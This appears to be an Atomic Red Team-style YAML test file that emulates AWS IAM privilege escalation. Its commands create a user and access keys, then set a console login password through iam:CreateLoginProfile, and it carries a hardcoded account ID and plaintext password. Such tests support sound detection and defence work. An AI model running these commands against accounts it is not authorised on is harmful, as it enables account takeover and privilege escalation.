attack_technique: TA0004.005
display_name: AWS Privillege Escalation 
atomic_tests:
- name: setup requirements
  auto_generated_guid: 8822c3b0-d9f9-4daf-a043-491160236122
  description: |
    Setting up a user, group, add user to group and create access keys
  supported_platforms:
  - macos
  - linux
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: "AtomicRedTeam"
    aws_account_id:
      description: AWS ACCOUNT ID
      type: String
      default: "591511147606"
    input_source_code:
      description: Path to source of aws_secret_code
      type: path
      default: PathToAtomicsFolder/TA0004.005/src/aws_secret.sh
  executor:
    command: |
      aws iam create-user --user-name #{username} 
      aws iam create-group --group-name #{username}
      aws iam add-user-to-group --user-name #{username} --group-name #{username}
      aws iam create-access-key --user-name AtomicRedTeam > $PathToAtomicsFolder/TA0004.005/bin/aws_secret.creds
      cd $PathToAtomicsFolder/TA0004.005/bin/
      ./aws_secret.sh
    cleanup_command: |
      
    name: sh

- name: iam:CreateLoginProfile
  auto_generated_guid: 8822c1b0-d9f9-4daf-a043-19f460226122
  description: |
    Users with the iam:CreateLoginProfile on other users can set a console login password for those users if they donâ€™t have one set yet. Potential Impact: This method would give an attacker the same level of permissions as any user they were able to create a login profile for, which could range from no privilege escalation to full administrator access to the account.
  supported_platforms:
  - macos
  - linux
  input_arguments:
    username:
      description: Username of the user to create a login profile for
      type: String
      default: "AtomicRedTeam"
    aws_account_id:
      description: AWS ACCOUNT ID
      type: String
      default: "591511147606"
  executor:
    command: |
      aws iam create-login-profile --user-name #{username} --password L1uUXdok9pNO9JNCY3CpV --no-password-reset-required

    cleanup_command: |
      access_key=`cat $PathToAtomicsFolder/TA0004.005/bin/aws_secret.creds| jq -r '.AccessKey.AccessKeyId'`
      aws iam delete-access-key --access-key-id $access_key --user-name #{username}
      aws iam delete-login-profile --user-name #{username}
      aws iam remove-user-from-group --user-name #{username} --group-name #{username}
      aws iam delete-user --user-name #{username}
      aws iam delete-group --group-name #{username}
    name: sh
    elevation_required: false